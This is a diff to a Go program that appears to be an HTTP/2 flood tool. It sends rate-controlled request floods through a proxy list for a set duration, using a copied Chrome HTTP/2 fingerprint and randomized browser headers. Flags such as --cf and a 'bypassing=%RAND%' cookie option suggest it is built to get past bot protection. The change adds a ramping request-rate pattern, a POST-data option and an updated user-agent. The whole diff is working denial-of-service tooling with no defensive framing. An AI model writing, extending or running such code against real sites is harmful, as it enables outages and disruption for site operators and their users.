@@ -42,26 +42,21 @@ var (
 	statusMutex    sync.Mutex
 )
 
-var pseudoHeaderOrder = []string{
-	":method",
-	":authority",
-	":scheme",
-	":path",
-}
-
-var settingsFrame = map[http2.SettingID]uint32{
-	http2.SettingHeaderTableSize:   65536,
-	http2.SettingEnablePush:        0,
-	http2.SettingInitialWindowSize: 6291456,
-	http2.SettingMaxHeaderListSize: 262144,
-}
-
-var settingsFrameOrder = []http2.SettingID{
-	http2.SettingHeaderTableSize,
-	http2.SettingEnablePush,
-	http2.SettingInitialWindowSize,
-	http2.SettingMaxHeaderListSize,
-}
+var (
+	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
+	settingsFrame = map[http2.SettingID]uint32{
+		http2.SettingHeaderTableSize:   65536,
+		http2.SettingEnablePush:        0,
+		http2.SettingInitialWindowSize: 6291456,
+		http2.SettingMaxHeaderListSize: 262144,
+	}
+	settingsFrameOrder = []http2.SettingID{
+		http2.SettingHeaderTableSize,
+		http2.SettingEnablePush,
+		http2.SettingInitialWindowSize,
+		http2.SettingMaxHeaderListSize,
+	}
+)
 
 func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
@@ -83,6 +78,7 @@ func main() {
 		--parsed -
 		--cf - 
 		--cookie <value> - for custom cookie and also cookie support %RAND% ex: --cookie "bypassing=%RAND%"
+		--postdata <value> -
 		`)
 		return
 	}
@@ -120,28 +116,25 @@ func main() {
 	}
 
 	for i := 0; i < len(os.Args); i++ {
-		if os.Args[i] == "--debug" {
-			debug = true
-		}
-		if os.Args[i] == "--extra" {
-			extra = true
-		}
-		if os.Args[i] == "--test" {
-			test = true
-		}
-		if os.Args[i] == "--close" {
-			closeConn = true
-		}
-		if os.Args[i] == "--redirect" {
-			redirect = true
-		}
-		if os.Args[i] == "--parsed" {
-			parsed = true
-		}
-		if os.Args[i] == "--cookie" && i+1 < len(os.Args) {
-			customCookie = os.Args[i+1]
-		}
-	}
+        switch os.Args[i] {
+        case "--debug":
+            debug = true
+        case "--extra":
+            extra = true
+        case "--test":
+            test = true
+        case "--close":
+            closeConn = true
+        case "--redirect":
+            redirect = true
+        case "--parsed":
+            parsed = true
+        case "--cookie":
+            if i+1 < len(os.Args) {
+                customCookie = os.Args[i+1]
+            }
+        }
+    }
 
 	readProxies()
 
@@ -163,8 +156,8 @@ func main() {
 	}
 
 	time.Sleep(time.Duration(duration) * time.Second)
-	os.Exit(1)
 }
+
 
 func detectProxyType(proxy string) string {
 	if strings.HasPrefix(proxy, "socks5://") {
@@ -254,7 +247,7 @@ func randomHeader() http.Header {
 		"sec-ch-ua-mobile":          []string{"?0"},
 		"sec-ch-ua-platform":        []string{`"Windows"`},
 		"upgrade-insecure-requests": []string{"1"},
-		"user-agent":                []string{`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36`},
+		"user-agent":                []string{`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`},
 		"accept":                    []string{`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`},
 		"sec-gpc":                   []string{"1"},
 		"accept-language":           []string{"en-US,en;q=0.7"},
@@ -299,13 +292,16 @@ func randomHeader() http.Header {
 func readProxies() {
 	file, err := os.Open(proxyFile)
 	if err != nil {
-		return
+		log.Fatalf("Failed to open proxy file: %v", err)
 	}
 	defer file.Close()
 
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
+	}
+	if err := scanner.Err(); err != nil {
+		log.Fatalf("Error reading proxy file: %v", err)
 	}
 }
 
@@ -337,7 +333,16 @@ func ResponseBody(resp *http.Response) {
 	pageContent := string(bodyBytes)
 	fmt.Println(pageContent)
 }
-
+func createRatePattern(max int) []int {
+	var pattern []int
+	for i := 1; i <= max; i++ {
+		pattern = append(pattern, i)
+	}
+	for i := max - 1; i >= 1; i-- {
+		pattern = append(pattern, i)
+	}
+	return pattern
+}
 func start(proxy string) {
 	proxyType := detectProxyType(proxy)
 
@@ -379,7 +384,7 @@ func start(proxy string) {
 	transport.H2transport = transport_http2
 
 	client := &http.Client{
-		Timeout:   10 * time.Second,
+		Timeout: time.Second * 10,
 		Transport: transport,
 	}
 
@@ -421,16 +426,17 @@ func start(proxy string) {
 		ResponseBody(resp)
 	}
 
-
-
+	ratePattern := createRatePattern(int(rps))
 	var wg sync.WaitGroup
-	
-		for i := 0; i < int(rps); i++ {
+
+	for _, rpsValue := range ratePattern {
+		ticker := time.NewTicker(time.Second / time.Duration(rpsValue))
+		defer ticker.Stop()
+
+		for i := 0; i < rpsValue; i++ {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
-				ticker := time.NewTicker(time.Second / time.Duration(rps))
-				defer ticker.Stop()
 				for range ticker.C {
 					resp, err := client.Do(req)
 					if err != nil {
@@ -443,6 +449,8 @@ func start(proxy string) {
 		}
 		time.Sleep(time.Second)
 	}
+	wg.Wait()
+}
 
 func updateStatusMap(statusCode int) {
 	statusMutex.Lock()
@@ -451,16 +459,14 @@ func updateStatusMap(statusCode int) {
 }
 
 func printStatuses() {
-	for {
-		if debug {
-			time.Sleep(1 * time.Second)
-			statusMutex.Lock()
-			fmt.Print("\033[H\033[2J") 
-			for code, count := range statusMap {
-				fmt.Printf("{ %d: %d }\n", code, count)
-			}
-			statusMap = make(map[int]int) 
-			statusMutex.Unlock()
+	for debug {
+		time.Sleep(time.Second)
+		statusMutex.Lock()
+		fmt.Print("\033[H\033[2J") // очистка консоли
+		for code, count := range statusMap {
+			fmt.Printf("{ %d: %d }\n", code, count)
 		}
+		statusMap = make(map[int]int) // очистка карты
+		statusMutex.Unlock()
 	}
 }
